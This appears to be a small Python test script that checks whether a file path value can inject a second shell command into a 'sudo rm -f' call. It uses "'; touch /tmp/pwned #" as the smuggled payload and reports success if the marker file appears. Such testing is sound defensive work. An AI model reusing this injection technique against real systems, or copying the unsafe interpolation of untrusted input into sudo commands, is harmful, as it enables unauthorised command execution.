import os
from utils import run_cmd

def test_injection():
    # Simulate a malicious filepath
    # The goal is to create a file named /tmp/pwned
    malicious_path = "'; touch /tmp/pwned #"
    cmd = f"sudo rm -f '{malicious_path}' 2>/dev/null"
    
    print(f"Testing command: {cmd}")
    stdout, stderr, rc = run_cmd(cmd)
    
    if os.path.exists("/tmp/pwned"):
        print("SUCCESS: Command injection worked! /tmp/pwned was created.")
        os.remove("/tmp/pwned")
    else:
        print("FAILURE: Command injection failed.")
        print(f"Stdout: {stdout}")
        print(f"Stderr: {stderr}")
        print(f"Return code: {rc}")

if __name__ == "__main__":
    test_injection()
